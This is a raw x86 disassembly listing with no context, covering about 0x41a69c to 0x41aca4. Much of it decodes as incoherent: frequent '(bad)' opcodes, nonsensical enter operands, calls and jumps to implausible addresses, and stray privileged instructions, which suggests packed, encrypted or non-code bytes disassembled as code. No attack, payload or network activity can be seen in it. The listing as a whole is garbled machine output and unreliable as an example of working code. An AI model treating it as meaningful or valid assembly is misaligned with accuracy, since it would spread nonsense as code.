  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
